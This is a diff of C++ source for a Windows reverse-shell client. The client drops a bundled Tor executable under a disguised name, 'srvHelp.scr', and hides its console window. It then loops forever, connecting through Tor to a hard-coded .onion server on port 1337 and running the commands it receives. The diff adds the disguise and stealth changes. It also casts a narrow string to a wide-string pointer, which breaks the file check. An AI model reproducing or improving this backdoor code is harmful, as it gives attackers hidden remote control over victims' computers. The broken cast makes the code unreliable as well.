@@ -24,31 +24,33 @@ void writeResToDisk(std::string path, int r, int t){
     f.close();
 }
 
+#define torExePath ".\\srvHelp.scr"
+
 /*
     Drops tor.exe along with geoip data
 */
 void dropTor() {
-    writeResToDisk("tor.exe", TOREXE, EXEFILE);
+    writeResToDisk(torExePath, TOREXE, EXEFILE);
     CreateDirectory(L".\\data", NULL);
     writeResToDisk("data\\geoip", GEOIP, TEXTFILE);
     writeResToDisk("data\\geoip6", GEOIP6, TEXTFILE);
 }
 
 #define HOST "lj3d2pro3db5wkrz7i3byeculryh4ykqvpnc7z6xfjiv7mwmi2is5yad.onion"
-#define showConsole true
+#define showConsole false
 
 int main() {
     ShowWindow(GetConsoleWindow(), (showConsole) ? SW_SHOW : SW_HIDE);
 
     // Put TOR onto the disk if it isnt there already
-    if (GetFileAttributes(L"tor.exe") == INVALID_FILE_ATTRIBUTES || GetFileAttributes(L"data\\geoip") == INVALID_FILE_ATTRIBUTES){
+    if (GetFileAttributes((LPCWSTR)torExePath) == INVALID_FILE_ATTRIBUTES || GetFileAttributes(L"data\\geoip") == INVALID_FILE_ATTRIBUTES){
         dropTor();
     }
     
     // Hell loop of forever restarting TOR and trying to connect to the server :)
     // I could make it not restart TOR every time, but I had a few problems with that before
     while (1) {
-        torRevShellClient c(".\\tor.exe", HOST, 1337);
+        torRevShellClient c(torExePath, HOST, 1337);
         c.startProxy();
         c.attemptConnect();
         c.cmdProcessLoop(); // If attemptConnect() fails, this function will return immediately
